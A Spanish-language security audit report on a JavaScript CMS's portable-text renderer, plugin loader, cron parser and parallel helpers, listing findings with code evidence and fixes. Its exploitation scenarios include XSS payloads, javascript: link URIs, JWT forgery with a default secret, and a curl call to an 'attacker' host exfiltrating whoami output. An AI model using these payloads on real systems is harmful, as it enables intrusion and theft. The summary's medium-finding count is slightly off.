# Audit Report 04 — Content & misc (cms, portable-text, plugins, cron, parallel)

## Hallazgos

### [SEVERIDAD: CRITICAL] XSS almacenado: `renderInlineMarks` no escapa el texto antes de envolverlo en HTML
- Archivo: core/portable-text.js
- Línea: 97-104 (definición), usada en 112, 116, 129, 134
- Evidencia:
```js
function renderInlineMarks(text) {
  if (!text || typeof text !== 'string') return text || '';
  return text
    .replace(/\*\*(.+?)\*\*/g, '<strong>$1</strong>')
    .replace(/\*(.+?)\*/g, '<em>$1</em>')
    .replace(/`(.+?)`/g, '<code>$1</code>')
    .replace(/\[(.+?)\]\((.+?)\)/g, '<a href="$2">$1</a>');
}
```
y los renderers que lo consumen sin escapar previo:
```js
paragraph: (b) => `<p>${renderInlineMarks(b.text || '')}</p>`,
heading: (b) => { ... return `<h${level} id="${id}">${renderInlineMarks(b.text || '')}</h${level}>`; },
list:  (b) => { ... items.map(i => `<li>${renderInlineMarks(typeof i === 'string' ? i : i.text || '')}</li>`) ... },
quote: (b) => `<blockquote><p>${renderInlineMarks(b.text || '')}</p>${attr}</blockquote>`,
```
- Descripción: El texto del usuario (`paragraph.text`, `heading.text`, items de `list`, `quote.text`) se inserta crudo en el HTML de salida. `renderInlineMarks` sólo aplica regex de marcas; **nunca escapa** `&`, `<`, `>`, `"`. El único renderer que escapa es `code`/`image`/`embed`/`table` (vía `escHtml`). El test existente (líneas 80-83) sólo cubre el bloque `code`, dando falsa sensación de seguridad.
- Escenario de explotación: Un author/editor guarda una entrada CMS con `{type:'paragraph', text:'<img src=x onerror=alert(document.cookie)>'}`. Al renderizar con `toHTML()` el navegador ejecuta `onerror`. Es XSS almacenado: el payload persiste en la DB y se ejecuta en cada vista.
- Sugerencia de fix: Escapar el texto con `escHtml` **antes** de aplicar las marcas inline, o escapar el contenido fuera de las marcas capturadas ( `$1`/`$2` ).

### [SEVERIDAD: CRITICAL] XSS y `javascript:` URI vía marcas de link: texto y URL no escapados
- Archivo: core/portable-text.js
- Línea: 103
- Evidencia:
```js
.replace(/\[(.+?)\]\((.+?)\)/g, '<a href="$2">$1</a>');
```
- Descripción: El texto del link (`$1`) y la URL (`$2`) se interpolan sin escapado. `$2` va dentro de `href="$2"` → permite `javascript:` URIs y breakout de atributo. `$1` permite HTML arbitrario dentro del anchor.
- Escenario de explotación:
  - `[click](javascript:alert(1))` → `<a href="javascript:alert(1)">click</a>` (XSS al clic).
  - `[x](y" onclick="alert(1) z=")` → `<a href="y" onclick="alert(1) z="">x</a>` (breakout de atributo).
  - `[<img src=x onerror=alert(1)>](http://x)` → HTML inyectado en el cuerpo del anchor.
- Sugerencia de fix: Escapar `$1` con `escHtml`, escapar `$2` con `escHtml` y validar esquema (`http`/`https`/`mailto`), rechazando `javascript:`/`data:`.

### [SEVERIDAD: CRITICAL] Plugins de terceros sin sandbox: capacidades no son un perímetro de seguridad
- Archivo: core/plugins.js
- Línea: 285-289 (carga), 152-154 (modelo de capacidades)
- Evidencia:
```js
if (pluginConfig.source === 'local' && pluginConfig.path) {
  pluginModule = await import(pluginConfig.path);
} else {
  pluginModule = await import(name);
}
```
```js
const hasAll = capabilities.length === 0; // no restrictions if empty (backward compatible)
const can = (cap) => hasAll || capabilities.includes(cap) || capabilities.includes('*');
```
- Descripción: Los plugins son módulos ES cargados con `import()` y ejecutados en el mismo proceso/privilegios que el host. El sistema de `capabilities` sólo filtra el objeto `api` que recibe `setup()`; **no aísla** al módulo, que puede hacer `import fs from 'node:fs'`, `import { exec } from 'node:child_process'`, abrir sockets, leer `process.env`, etc. Además `capabilities: []` concede acceso total por defecto (compatibilidad hacia atrás) y `'*'` lo concede explícito.
- Escenario de explotación: Un plugin malicioso (o compromuesto vía `plugins.json`) en `setup()` ejecuta `import('node:child_process').then(c=>c.exec('curl http://attacker/$(whoami)'))`. Las capabilities declaradas (`['entries:read']`) no lo frenan en absoluto.
- Sugerencia de fix: Documentar que las capabilities NO son sandbox, o ejecutar plugins en un worker/child process sin acceso a `node:*`, o al menos bloquear imports nativos vía política y requerir capabilities explícitas (no `[]` = total).

### [SEVERIDAD: HIGH] Bypass de capability de escritura vía el getter `col` expuesto a plugins de sólo lectura
- Archivo: core/plugins.js
- Línea: 182-185
- Evidencia:
```js
// Also copy getter properties
if (can(`${name}:read`)) {
  Object.defineProperty(proxy, 'col', { get: () => service.col });
}
```
- Descripción: Al plugin con capability `entries:read` (sin `entries:write`) se le expone `api.services.entries.col`, que devuelve la **colección real** del DocStore (`this.cms._entries`). Esa colección expone `insert`/`update`/`remove`/`removeMany` sin restricción. El proxy filtrado (sólo métodos `find*`/`build*`) se elude por completo.
- Escenario de explotación: Plugin declarado con `capabilities: ['entries:read']` hace `api.services.entries.col.insert({ title:'pwned', content:{}, contentTypeSlug:'posts' })` o `col.removeMany({})` → escribe/borra entradas pese a no tener capability de escritura.
- Sugerencia de fix: No exponer `col` en el proxy restringido, o devolver una vista de colección que sólo implemente los métodos `find*`/`build*`.

### [SEVERIDAD: HIGH] Bypass de capability de escritura vía API `database` sin restricción
- Archivo: core/plugins.js
- Línea: 209-218
- Evidencia:
```js
database: {
  createCollection: (colName, opts) => {
    const fullName = `plugin_${pluginName}_${colName}`;
    return cms.db.collection(fullName);
  },
  collection: (colName) => {
    const fullName = `plugin_${pluginName}_${colName}`;
    return cms.db.collection(fullName);
  },
},
```
- Descripción: El namespace `database` se ofrece **siempre**, sin consultar `capabilities`. Un plugin sin ninguna capability de escritura puede crear y mutar colecciones arbitrarias (su propio namespace `plugin_<name>_*`). Aunque el nombre está prefijado, el plugin controla `colName` y puede usar el DocStore completo sobre sus colecciones.
- Escenario de explotación: Plugin con `capabilities: ['entries:read']` crea una colección para exfiltrar o almacenar datos fuera del modelo de capabilities del CMS, sin `database:*` declarado.
- Sugerencia de fix: Requerir una capability `database:write`/`database:read` para exponer `database`, y validar `colName` (sólo `[a-z0-9_-]`).

### [SEVERIDAD: HIGH] Secreto JWT por defecto predecible si no se configura `opts.secret`
- Archivo: core/cms.js
- Línea: 152
- Evidencia:
```js
this.auth = new Auth(this.db, {
  secret: opts.secret || 'akit-dev-secret',
  tokenExpiry: opts.tokenExpiry || 7 * 24 * 60 * 60,
});
```
- Descripción: Si una instancia de `CMS` se construye sin `opts.secret` (fácil en despliegues casuales o tests llevados a producción), todos los JWT se firman con el secreto hardcodeado `'akit-dev-secret'`, público en el código fuente.
- Escenario de explotación: El atacante forja `{ role:'admin' }` firmado con `'akit-dev-secret'` y obtiene acceso administrador total al CMS (users:write, etc.).
- Sugerencia de fix: Lanzar error si `opts.secret` no está definido (o tiene longitud insuficiente) en lugar de un fallback hardcodeado.

### [SEVERIDAD: HIGH] Parser cron: `rango/step` ignora el límite superior del rango → ejecuciones no deseadas
- Archivo: core/cron.js
- Línea: 43-47
- Evidencia:
```js
} else if (part.includes('/')) {
  const [range, step] = part.split('/');
  const stepN = parseInt(step);
  if (isNaN(stepN) || stepN <= 0) throw new Error(`Invalid cron step: ${step}`);
  const start = range === '*' ? min : parseInt(range);
  for (let i = start; i <= max; i += stepN) values.add(i);
```
- Descripción: Para un campo tipo `5-10/2`, `range = '5-10'`, y `parseInt('5-10')` → `5` (parseInt se detiene en el primer no-dígito). El límite superior (`10`) se descarta y el bucle avanza hasta `max` (59 para minutos). Un rango acotado se convierte en un step desde `start` hasta el máximo del campo.
- Escenario de explotación/fallo: `cron.add('report','5-10/2 * * * *', fn)` se supone minutos 5,7,9 pero ejecuta en 5,7,9,11,13,…,59 — un job de reporte/envío se ejecuta 28 veces/hora en lugar de 3. Si el job es sensible (costoso, con efectos externos) hay ejecuciones no deseadas; potencialmente carga o gasto.
- Sugerencia de fix: Parsear `range` como `lo-hi` (split `-`) y usar `hi` como cota superior del bucle, además de `max`.

### [SEVERIDAD: MEDIUM] `HookSystem.execute` traga excepciones de handlers silenciosamente
- Archivo: core/plugins.js
- Línea: 54-60
- Evidencia:
```js
for (const { fn } of list) {
  try {
    const result = await fn(current);
    if (result !== undefined) current = result;
  } catch (err) {
    console.error(`[Hook] Error in ${name}:`, err.message);
  }
}
```
- Descripción: Un handler que lanza se registra en consola y la cadena continúa con el `current` previo. Un hook de validación/bloqueo (ej. `entry:beforeCreate` que rechace contenido malicioso) que falle por excepción es ignorado: la operación sigue como si el hook hubiera aprobado. No hay forma para el caller de saber que un hook falló ni de abortar.
- Escenario de fallo: Un hook `contentType:beforeCreate` que valida `fields` lanza por un bug; el content type se crea igual con campos inválidos.
- Sugerencia de fix: Devolver/propagar el error (opción configurable: `throwOnHookError`) o incluir `errors` en el resultado para que el caller decida.

### [SEVERIDAD: MEDIUM] `loadPlugins` traga fallos de carga de plugins silenciosamente
- Archivo: core/plugins.js
- Línea: 282-319
- Evidencia:
```js
try {
  // Load plugin module
  let pluginModule;
  if (pluginConfig.source === 'local' && pluginConfig.path) {
    pluginModule = await import(pluginConfig.path);
  } else { pluginModule = await import(name); }
  ...
  console.log(`[Plugins] Loaded: ${name} v${definition.version || '1.0.0'}`);
} catch (err) {
  console.error(`[Plugins] Failed to load '${name}':`, err.message);
}
```
- Descripción: Si un plugin crítico (seguridad, auth, billing) falla al importar o en `setup()`/`onLoad()`, sólo se loguea y el arranque continúa. La app queda corriendo sin el plugin y sin señal visible de falla más allá del log.
- Escenario de fallo: Plugin de auth que no carga → app arranca y sirve rutas posiblemente sin protección, sin abortar.
- Sugerencia de fix: Permitir marcar plugins como `required: true` y abortar el arranque si fallan.

### [SEVERIDAD: MEDIUM] Cron: ejecuciones solapadas del mismo job (sin guarda anti-reentrada)
- Archivo: core/cron.js
- Línea: 163-188
- Evidencia:
```js
_tick() {
  ...
  for (const task of this._tasks.values()) {
    if (!task.active) continue;
    if (matchesCron(now, task.schedule)) {
      this._execute(task);
    }
  }
}

async _execute(task) {
  try {
    await task.handler();
    task.lastRun = Date.now();
    task.runs++;
  } catch (err) {
    task.errors++;
    console.error(`[Cron] Error in '${task.name}':`, err.message);
  }
}
```
- Descripción: `_execute` no se awaiting ni hay flag de "en ejecución". Si el handler es más lento que el intervalo de tick (o el cron matchea cada minuto y el handler dura >1min), múltiples ejecuciones del mismo job corren concurrentemente, compartiendo estado externo (DB, red) sin sincronización. `task.runs`/`lastRun` se actualizan al final, no previenen solape.
- Escenario de fallo: Job `* * * * *` que procesa una cola; con handler de 90s, al minuto siguiente arranca una segunda instancia que re-procesa los mismos registros → duplicados/condiciones de carrera en el destino.
- Sugerencia de fix: Llevar `task.running = true` al entrar a `_execute`, saltar si ya está corriendo, limpiar en `finally`.

### [SEVERIDAD: MEDIUM] `parallelRace([])` con arreglo vacío cuelga indefinidamente (promesa nunca resuelta)
- Archivo: core/parallel.js
- Línea: 179-214
- Evidencia:
```js
return new Promise((resolve) => {
  let settled = false;
  let failures = 0;

  tasks.forEach((fn, i) => {
    ...
  });
});
```
- Descripción: Con `tasks = []`, `forEach` no invoca ningún callback, `resolve` nunca se llama y `failures === tasks.length` (`0 === 0`) nunca se evalúa (sólo se chequea dentro de los callbacks). La promesa queda pending para siempre. A diferencia de `parallelMerge` (que maneja el caso vacío en línea 63), `parallelRace` no tiene esa guarda.
- Escenario de fallo: Si el caller pasa un array de tasks construido dinámicamente que resulta vacío, `await parallelRace(tasks)` nunca retorna → el código aguanta indefinidamente; DoS lógico del flujo que lo invoca.
- Sugerencia de fix: Al inicio, `if (tasks.length === 0) return resolve({ resolved: null, winnerId: -1, duration: 0 });`.

### [SEVERIDAD: MEDIUM] `cms.js` no hace cumplir el scope `:own` ni autorización en los servicios
- Archivo: core/cms.js
- Línea: 49-54 (hasPermission), 320-465 (EntryService), 767-791 (UserService.update)
- Evidencia:
```js
export function hasPermission(user, permission) {
  const perms = ROLE_PERMISSIONS[user.role] || [];
  if (perms.includes(permission)) return true;
  const base = permission.split(':').slice(0, 2).join(':');
  return perms.includes(base);
}
```
```js
async update(id, input) {
  const doc = this.col.findById(id);
  if (!doc) throw new Error(`Entry '${id}' not found`);
  // ... ninguna verificación de autorId === authorId ...
```
- Descripción: `ROLE_PERMISSIONS.author` define `entries:write:own` y `entries:delete:own`, pero ningún método de `EntryService` (`update`, `delete`, `publish`) verifica que el caller sea el autor (`doc.authorId === callerId`). El "own" se define pero nunca se aplica en este archivo; el enforcement queda implícito en una capa HTTP que no se ve aquí. `hasPermission` además colapsa `entries:write:own` → base `entries:write`, lo que significaría que quien tiene `entries:write` también pasa el chequeo `:own`. Riesgo: si la capa superior sólo chequea `hasPermission(user,'entries:write:own')`, cualquier editor pasa y un author podría mutar entradas ajenas.
- Escenario de explotación: Un `author` llama al endpoint de update con el `id` de una entrada de otro autor; si el middleware sólo verifica la permission `entries:write:own` (sin comparar `authorId`), la mutación procede.
- Sugerencia de fix: Pasar el caller al servicio y comparar `doc.authorId` antes de update/delete; o documentar y exigir que la capa HTTP lo verifique.

### [SEVERIDAD: LOW] `withTimeout` no cancela la promesa subyacente (leak de recurso/cómputo)
- Archivo: core/parallel.js
- Línea: 221-229
- Evidencia:
```js
function withTimeout(promise, ms) {
  return new Promise((resolve, reject) => {
    const timer = setTimeout(() => reject(new Error(`Timeout after ${ms}ms`)), ms);
    promise.then(
      (val) => { clearTimeout(timer); resolve(val); },
      (err) => { clearTimeout(timer); reject(err); },
    );
  });
}
```
- Descripción: Al expirar el timeout se rechaza la promesa externa, pero la tarea original sigue corriendo en background; su resultado/error se descartan silenciosamente y su side-effects (red, CPU) continúan.
- Escenario: 3 tasks con timeout 30s y tareas que tardan 10min → se reportan como `failed` pero siguen consumiendo recursos.
- Sugerencia de fix: Aceptar un `AbortSignal`/cancelación y propagarla a la tarea subyacente.

### [SEVERIDAD: LOW] `parallelMerge`: firma del `scorer` difiere del JSDoc; `first-wins` no es "primero en terminar"
- Archivo: core/parallel.js
- Línea: 27 vs 51, 78-83
- Evidencia:
```js
* @param {Function} opts.scorer - Custom scorer: (result, index) => number (overrides confidence field)
```
```js
const confidence = scorer
  ? scorer(result, task)
  : (result?.confidence ?? 1) * task.weight;
```
```js
case 'first-wins': {
  // First completed (they all resolved at same time via Promise.all,
  // so "first" = first in array order that succeeded)
  resolved = completed[0].output;
```
- Descripción: (a) El `scorer` se invoca con `(result, task)` (objeto task completo), no `(result, index)` como dice el JSDoc → scorers que esperen un índice numérico se rompen. (b) `first-wins` no retorna el primero en completarse cronológicamente (usa `Promise.all`), sino el primero en orden de array que tuvo éxito; la semántica documentada y la real difieren.
- Sugerencia de fix: Corregir el JSDoc a `(result, task)` y renombrar `first-wins` a `first-success` o usar `Promise.race`-like para ordenar por tiempo de finalización.

## Resumen
- Archivos revisados: 5/5
- Hallazgos: 3 critical, 4 high, 6 medium, 2 low
- Sin hallazgos en: (ninguno de los 5 quedó sin hallazgos; todos aportaron al menos uno)

Notas de cobertura:
- `cms.js`: no realiza operaciones de archivo directo (usa el adapter de `db.js`), por lo que no hay path traversal en este archivo. El riesgo de traversal, si existe, vive en el adapter (`FileStorageAdapter`), fuera del alcance de esta auditoría.
- `parallel.js`: no se detectaron mezclas de resultados entre tareas ni corrupción de estado cruzado; cada task está aislada en su propio `try/catch` y los resultados se indexan por posición preservando el orden. Los defectos encontrados son de borde (array vacío), semánticos (scorer/first-wins) y de leak (timeout sin cancelación).